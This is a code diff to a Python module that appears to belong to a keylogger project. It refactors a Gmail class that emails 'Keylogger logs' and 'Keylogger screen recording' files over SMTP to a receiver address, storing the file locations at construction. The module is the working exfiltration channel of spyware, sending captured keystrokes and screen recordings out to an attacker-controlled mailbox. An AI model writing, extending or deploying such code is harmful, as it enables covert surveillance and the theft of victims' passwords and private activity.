@@ -8,10 +8,17 @@ from ..interfaces import MessengerBase
 
 
 class Gmail(MessengerBase):
-    def __init__(self, sender_address, app_password, receiver_address):
+    def __init__(self,
+                 sender_address,
+                 app_password,
+                 receiver_address,
+                 log_file_location,
+                 screen_recorder_file_location):
         self._sender_address = sender_address
         self._app_password = app_password
         self._receiver_address = receiver_address
+        self.log_file_location = log_file_location
+        self.screen_recorder_file_location = screen_recorder_file_location
         self._context = ssl.create_default_context()
 
     @property
@@ -36,20 +43,21 @@ class Gmail(MessengerBase):
         print(f"Setting receiver address to: {address}")
         self._receiver_address = address
 
-    def send_logs(self, file):
+    def send_logs(self):
         message = self._initialize_mail("Keylogger logs")
-        message = self._attach_log_file(message, file)
+        message = self._attach_log_file(message, self.log_file_location)
         self.send_mail(message)
 
-    def send_recording(self, file):
+    def send_recording(self):
         message = self._initialize_mail("Keylogger screen recording")
-        message = self._attach_recording(message, file)
+        message = self._attach_recording(message, self.screen_recorder_file_location)
         self.send_mail(message)
 
     def send_mail(self, message):
         with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=self._context) as server:
             server.login(self._sender_address, self._app_password)
             server.sendmail(self._sender_address, self._receiver_address, message.as_string())
+
     def _attach_log_file(self, message, filename):
         f = open(filename)
         attachment = MIMEText(f.read())
@@ -72,6 +80,7 @@ class Gmail(MessengerBase):
         message['Subject'] = subject
         message.attach(MIMEText(body, 'plain'))
         return message
+
 
 class InvalidEmailException(Exception):
     """Given email is invalid"""
